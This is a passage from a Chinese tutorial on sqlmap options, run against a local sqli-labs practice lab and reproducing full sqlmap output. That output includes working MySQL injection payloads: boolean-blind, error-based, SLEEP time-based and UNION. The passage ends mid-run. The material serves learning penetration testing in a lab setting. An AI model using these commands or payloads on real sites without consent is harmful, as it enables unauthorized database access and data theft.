- U：Union query-based（可联合查询注入）
- S：Stacked queries（可多语句查询注入）
- T：Time-based blind（基于时间延迟注入）
- Q：Inline queries（嵌套查询注入）

举例：
可以用`–technique ES`来指定使用两种检测技术;
`–technique BEUSTQ`与默认情况等效。
布尔型注入测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-3/?id=1 --technique B --current-db
1
```

打印

```shell
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.2.31#dev}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:01:28 /2020-03-01/

[11:01:28] [INFO] testing connection to the target URL
[11:01:29] [INFO] checking if the target is protected by some kind of WAF/IPS
[11:01:29] [INFO] testing if the target URL content is stable
[11:01:29] [INFO] target URL content is stable
[11:01:29] [INFO] testing if GET parameter 'id' is dynamic
[11:01:29] [INFO] GET parameter 'id' appears to be dynamic
[11:01:29] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[11:01:29] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[11:01:29] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[11:01:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:01:35] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")
[11:01:35] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 17 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1') AND 7837=7837 AND ('Inoj'='Inoj
---
[11:01:38] [INFO] testing MySQL
[11:01:38] [INFO] confirming MySQL
[11:01:38] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[11:01:38] [INFO] fetching current database
[11:01:38] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[11:01:38] [INFO] retrieved: security
current database: 'security'
[11:01:39] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 11:01:39 /2020-03-01/

                                                                                                                                                                                                                                                                                                                  
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748
```

显然，此时的类型只有boolean-based blind。

### 2.sqlmap设置时间盲注延迟时间

参数：
`–time-sec`
用此参数设置基于时间延迟注入中延时时长，默认为5秒。

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-3/?id=1 --current-db --time-sec 3
1
```

打印

```shell
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:06:57 /2020-03-01/

[11:06:57] [INFO] testing connection to the target URL
[11:06:57] [INFO] checking if the target is protected by some kind of WAF/IPS
[11:06:57] [INFO] testing if the target URL content is stable
[11:06:58] [INFO] target URL content is stable
[11:06:58] [INFO] testing if GET parameter 'id' is dynamic
[11:06:58] [INFO] GET parameter 'id' appears to be dynamic
[11:06:58] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[11:06:58] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[11:06:58] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[11:07:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:07:06] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")
[11:07:06] [INFO] testing 'Generic inline queries'
[11:07:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[11:07:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[11:07:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[11:07:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[11:07:06] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[11:07:06] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[11:07:06] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[11:07:06] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[11:07:06] [INFO] testing 'MySQL inline queries'
[11:07:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[11:07:06] [WARNING] time-based comparison requires larger statistical model, please wait......... (done)
[11:07:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[11:07:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[11:07:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[11:07:06] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[11:07:06] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[11:07:06] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[11:07:13] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[11:07:13] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:07:13] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[11:07:13] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[11:07:13] [INFO] target URL appears to have 3 columns in query
[11:07:13] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1') AND 1324=1324 AND ('QGoK'='QGoK

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1') AND (SELECT 4928 FROM(SELECT COUNT(*),CONCAT(0x71707a6b71,(SELECT (ELT(4928=4928,1))),0x716a6a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('LiLq'='LiLq

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1') AND (SELECT 9581 FROM (SELECT(SLEEP(3)))pIsh) AND ('YbSn'='YbSn

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-2335') UNION ALL SELECT NULL,NULL,CONCAT(0x71707a6b71,0x6f74417665587859716869647543466d4c486e59584d504148467673707957736957435651565950,0x716a6a7071)-- -
---
[11:07:45] [INFO] the back-end DBMS is MySQL
[11:07:45] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS: MySQL >= 5.0
[11:07:45] [INFO] fetching current database
current database: 'security'
[11:07:45] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 11:07:45 /2020-03-01/

                                                                                                                                                                                                                                                                                                             
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980
```

其中有一段

```shell
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: id=1') AND (SELECT 9581 FROM (SELECT(SLEEP(3)))pIsh) AND ('YbSn'='YbSn
123
```

`SELECT(SLEEP(3))`即让select语句延迟3秒。

### 3.sqlmap设置union字段数

在进行联合查询注入时，Sqlmap会自动检测列数，范围是1到10；
当level值较高时列数检测范围的上限会扩大到50。
参数：
`--union-cols`
可以用此参数指定列数检测范围，如`--union-cols 12-16`就会让Sqlmap的列数检测范围变成12到16。
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-3/?id=1 --technique U --current-db -v 3 --union-cols 12-18
1
```

显示：



<iframe id="27tKMTYq-1583047991413" src="https://player.youku.com/embed/XNDU2ODY1MTA3Mg==" allowfullscreen="true" data-mediaembed="youku" style="box-sizing: border-box; outline: 0px; margin: 0px; padding: 0px; font-weight: normal; font-family: &quot;Microsoft YaHei&quot;, &quot;SF Pro Display&quot;, Roboto, Noto, Arial, &quot;PingFang SC&quot;, sans-serif; overflow-wrap: break-word; display: block; width: 660px; height: 330px;"></iframe>

union-cols



### 4.sqlmap设置union字符

参数：
`–union-char`
默认情况下Sqlmap进行联合查询注入时使用空字符(NULL)。
但当level值较高时Sqlmap会生成随机数用于联合查询注入，因为有时使用空字符注入会失败而使用随机数会成功。

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-3/?id=1 --technique U --current-db -v 3 --union-cols 12-18 --level 3 --union-char 123
1
```

显示：



<iframe id="vav0Vp4o-1583048162397" src="https://player.youku.com/embed/XNDU2ODY1NjUwOA==" allowfullscreen="true" data-mediaembed="youku" style="box-sizing: border-box; outline: 0px; margin: 0px; padding: 0px; font-weight: normal; font-family: &quot;Microsoft YaHei&quot;, &quot;SF Pro Display&quot;, Roboto, Noto, Arial, &quot;PingFang SC&quot;, sans-serif; overflow-wrap: break-word; display: block; width: 660px; height: 330px;"></iframe>

union-char



### 5.sqlmap设置union查询表

参数：
`–union-from`
有些情况下在联合查询中必须指定一个有效和可访问的表名，否则联合查询会执行失败。

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-3/?id=1 --technique U --current-db -v 3 --union-cols 12-18 --level 3 --union-char 123 --union-from users
1
```

显示：



<iframe id="lEw0pwR1-1583048206691" src="https://player.youku.com/embed/XNDU2ODY2MDM2NA==" allowfullscreen="true" data-mediaembed="youku" style="box-sizing: border-box; outline: 0px; margin: 0px; padding: 0px; font-weight: normal; font-family: &quot;Microsoft YaHei&quot;, &quot;SF Pro Display&quot;, Roboto, Noto, Arial, &quot;PingFang SC&quot;, sans-serif; overflow-wrap: break-word; display: block; width: 660px; height: 330px;"></iframe>

union-from



### 6.sqlmap识别指纹

探测目标指纹信息：
参数：
`-f`或者`--fingerprint`
参数的用法和作用和`--banner`类似。
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-3/?id=1 -f
1
```

打印

```shell
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:31:12 /2020-03-01/

[12:31:13] [INFO] testing connection to the target URL
[12:31:13] [INFO] testing if the target URL content is stable
[12:31:13] [INFO] target URL content is stable
[12:31:13] [INFO] testing if GET parameter 'id' is dynamic
[12:31:13] [INFO] GET parameter 'id' appears to be dynamic
[12:31:13] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[12:31:13] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[12:31:13] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[12:31:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:31:40] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")
[12:31:40] [INFO] testing 'Generic inline queries'
[12:31:40] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[12:31:40] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[12:31:40] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[12:31:40] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[12:31:40] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[12:31:40] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[12:31:40] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[12:31:40] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[12:31:40] [INFO] testing 'MySQL inline queries'
[12:31:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[12:31:40] [WARNING] time-based comparison requires larger statistical model, please wait......... (done)
[12:31:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[12:31:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[12:31:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[12:31:41] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[12:31:41] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[12:31:41] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:31:51] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[12:31:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[12:31:51] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[12:31:51] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[12:31:51] [INFO] target URL appears to have 3 columns in query
[12:31:51] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1') AND 1945=1945 AND ('oLHz'='oLHz

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1') AND (SELECT 6730 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT (ELT(6730=6730,1))),0x716a786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('IlMq'='IlMq

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1') AND (SELECT 1477 FROM (SELECT(SLEEP(5)))GkLS) AND ('Wwjt'='Wwjt

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-4873') UNION ALL SELECT NULL,CONCAT(0x716a6a7171,0x45744c655268474b765270526d476a6a574a6d53776b4c637753784d664c6544774d766e664a5950,0x716a786a71),NULL-- -
---
[12:31:54] [INFO] testing MySQL
[12:31:54] [INFO] confirming MySQL
[12:31:54] [INFO] the back-end DBMS is MySQL
[12:31:54] [INFO] actively fingerprinting MySQL
[12:31:55] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[12:31:55] [INFO] executing MySQL comment injection fingerprint
back-end DBMS: active fingerprint: MySQL >= 5.7
               comment injection fingerprint: MySQL 5.7.26
               html error message fingerprint: MySQL
[12:31:55] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 12:31:55 /2020-03-01/


1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283
```

显示了`active fingerprint`，即显示了数据库的一些基本信息。

# Python全栈（五）Web安全攻防之5.sqlmap检索DBMS信息和SQL注入

## 一、sqlmap检索DBMS信息

### 1.sqlmap检索DBMS banner

参数：
`--banner`或者`-b`
获取后端数据库banner信息。
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --banner
1
```

打印

```shell
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:59:39 /2020-03-02/

[07:59:40] [INFO] testing connection to the target URL
[07:59:40] [INFO] checking if the target is protected by some kind of WAF/IPS
[07:59:40] [INFO] testing if the target URL content is stable
[07:59:41] [INFO] target URL content is stable
[07:59:41] [INFO] testing if GET parameter 'id' is dynamic
[07:59:41] [INFO] GET parameter 'id' appears to be dynamic
[07:59:41] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[07:59:41] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[07:59:41] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[07:59:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[07:59:47] [WARNING] reflective value(s) found and filtering out
[07:59:47] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")
[07:59:47] [INFO] testing 'Generic inline queries'
[07:59:47] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[07:59:47] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[07:59:47] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[07:59:47] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[07:59:47] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[07:59:47] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[07:59:47] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[07:59:47] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[07:59:47] [INFO] testing 'MySQL inline queries'
[07:59:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[07:59:47] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)
[07:59:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[07:59:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[07:59:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[07:59:48] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[07:59:48] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[07:59:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[07:59:58] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[07:59:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[07:59:58] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[07:59:58] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[07:59:58] [INFO] target URL appears to have 3 columns in query
[07:59:58] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 1677=1677 AND 'TzaH'='TzaH

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 1079 FROM(SELECT COUNT(*),CONCAT(0x71706a6a71,(SELECT (ELT(1079=1079,1))),0x716a707171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'sFVr'='sFVr

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 3298 FROM (SELECT(SLEEP(5)))VyAw) AND 'thOf'='thOf

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-8780' UNION ALL SELECT NULL,NULL,CONCAT(0x71706a6a71,0x466d6c5a6c706d6e6f575a514d446469445872776c4977674c4b727a4f6557744272736173736274,0x716a707171)-- -
---
[08:00:29] [INFO] the back-end DBMS is MySQL
[08:00:29] [INFO] fetching banner
[08:00:30] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS: MySQL >= 5.0
banner: '5.7.26'
[08:00:30] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 08:00:30 /2020-03-02/


123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081
```

显示后端DBMS是MySQL，版本为5.7.26，`--banner`信息为数据库版本等基本信息。

### 2.sqlmap检索DBMS当前数据库

参数：
`--current-db`
获取当前数据库名。
sqli用的数据库是security，进行测试验证：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --current-db
1
```

打印

```shell
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:05:30 /2020-03-02/

[08:05:31] [INFO] testing connection to the target URL
[08:05:31] [INFO] checking if the target is protected by some kind of WAF/IPS
[08:05:31] [INFO] testing if the target URL content is stable
[08:05:31] [INFO] target URL content is stable
[08:05:31] [INFO] testing if GET parameter 'id' is dynamic
[08:05:31] [INFO] GET parameter 'id' appears to be dynamic
[08:05:31] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[08:05:31] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[08:05:31] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[08:05:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:05:33] [WARNING] reflective value(s) found and filtering out
[08:05:34] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")
[08:05:34] [INFO] testing 'Generic inline queries'
[08:05:34] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[08:05:34] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[08:05:34] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[08:05:34] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[08:05:34] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[08:05:34] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[08:05:34] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[08:05:34] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[08:05:34] [INFO] testing 'MySQL inline queries'
[08:05:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[08:05:34] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)
[08:05:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[08:05:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[08:05:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[08:05:34] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[08:05:34] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[08:05:34] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[08:05:44] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[08:05:44] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[08:05:44] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[08:05:44] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[08:05:44] [INFO] target URL appears to have 3 columns in query
[08:05:44] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 1645=1645 AND 'gLeh'='gLeh

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 5033 FROM(SELECT COUNT(*),CONCAT(0x7162707171,(SELECT (ELT(5033=5033,1))),0x717a7a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'prKI'='prKI

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 4986 FROM (SELECT(SLEEP(5)))JzND) AND 'MonR'='MonR

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-2369' UNION ALL SELECT NULL,NULL,CONCAT(0x7162707171,0x786d7141526c7542417379654d4d56465a7276617a52754e766b514779656d5a51677a566e784b6f,0x717a7a6271)-- -
---
[08:05:46] [INFO] the back-end DBMS is MySQL
[08:05:46] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS: MySQL >= 5.0
[08:05:46] [INFO] fetching current database
current database: 'security'
[08:05:46] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 08:05:46 /2020-03-02/


12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182
```

显示当前数据库为security。
加入`--batch`参数可以使所有选项都为默认选项：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --current-db --batch
1
```

打印

```shell
        ___                                                                                                                                               
       __H__                                                                                                                                              
 ___ ___["]_____ ___ ___  {1.4.2.31#dev}                                                                                                                  
|_ -| . [']     | .'| . |                                                                                                                                 
|___|_  [.]_|_|_|__,|  _|                                                                                                                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                               
                                                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appli
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program               
                                                                                                                                                          
[*] starting @ 08:08:24 /2020-03-02/                                                                                                                      
                                                                                                                                                          
[08:08:24] [INFO] testing connection to the target URL                                                                                                    
